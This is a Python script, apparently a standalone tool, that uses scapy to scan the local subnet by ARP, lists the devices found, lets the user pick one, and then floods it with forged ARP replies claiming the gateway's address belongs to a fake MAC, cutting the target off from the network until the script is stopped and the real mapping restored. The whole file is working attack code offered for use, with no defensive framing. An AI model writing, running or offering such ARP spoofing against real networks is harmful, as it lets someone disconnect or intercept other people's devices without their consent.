import time
from scapy.all import arping, logging, ARP, send, socket

class ARPSpoofing:
    def __init__(self):
        self.update_info()

    def update_info(self):
        self.ips_macs, self.gateway_ip = self.network_info()

    def get_lan_ip(self):
        # A hacky method to get the current lan ip address. It requires internet access, but it works
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com", 80))
        ip = s.getsockname()
        s.close()
        return ip[0]

    def get_ips_macs(self, ips):
        # Returns a list of tupples containing the (ip, mac address) of all of the computers on the network
        answers, uans = arping(ips, verbose=0)
        ip_mac = {}
        for answer in answers:
            ip, mac = answer[1].psrc, answer[1].hwsrc
            ip_mac[ip] = mac
        return ip_mac

    def network_info(self):
        # Use the current ip XXX.XXX.XXX.XXX and get a string in
        # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
        # the script assumes that the default gateway is "XXX.XXX.XXX.1"

        my_ip = self.get_lan_ip()
        ip_list = my_ip.split('.')

        del ip_list[-1]
        ip_list.append('0/24')
        ip_range = '.'.join(ip_list)

        del ip_list[-1]
        ip_list.append('1')
        gateway_ip = '.'.join(ip_list)

        ips_macs = self.get_ips_macs(ip_range)
        return ips_macs, gateway_ip
  
    def get_mac(self, ip): 
        return self.ips_macs[ip]
  
    def spoof(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=target_ip, hwdst=target_mac)
        send(packet, verbose = False) 
    
    def restore(self, target_ip, gateway_ip): 
        target_mac = self.get_mac(target_ip) 
        gateway_mac = self.get_mac(gateway_ip)
        packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
        send(packet, verbose = False) 

    def choose_target(self):
        devices, count = [], 0
        for ip in self.ips_macs:
            mac = self.ips_macs[ip]
            print(f"{count} -> {ip} - {mac}")
            devices.append((ip, mac))
            count += 1
        index = int(input("Choose one device: "))
        target_ip, _ = devices[index]
        return target_ip
    
    def kick_off(self):
        target_ip = self.choose_target()
        try:
            while True:
                self.spoof(target_ip, self.gateway_ip)
        except KeyboardInterrupt: 
            print("\nCtrl + C pressed.............Exiting") 
            self.restore(target_ip, self.gateway_ip) 
            print("[+] Arp Spoof Stopped")
    
    def menu(self):
        self.kick_off()
            
arp_sp = ARPSpoofing()
arp_sp.menu()